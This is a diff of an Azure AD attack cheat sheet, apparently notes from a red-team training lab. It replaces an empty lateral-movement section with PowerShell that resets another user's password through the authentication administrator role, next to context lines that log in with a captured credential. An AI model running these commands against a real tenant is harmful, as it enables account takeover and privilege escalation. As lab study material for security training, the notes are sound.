@@ -1477,55 +1477,12 @@ $creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@de
 Connect-AzAccount -Credential $creds
 ```
 
-# Lateral movement
-####
-```
+## Reset password
+- Reset password if user has "authentication administrator" role on a group or administrative unit.
 
 ```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
-####
-```
-
+$password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText –Force
+(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributorx@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
 ```
 
 ####
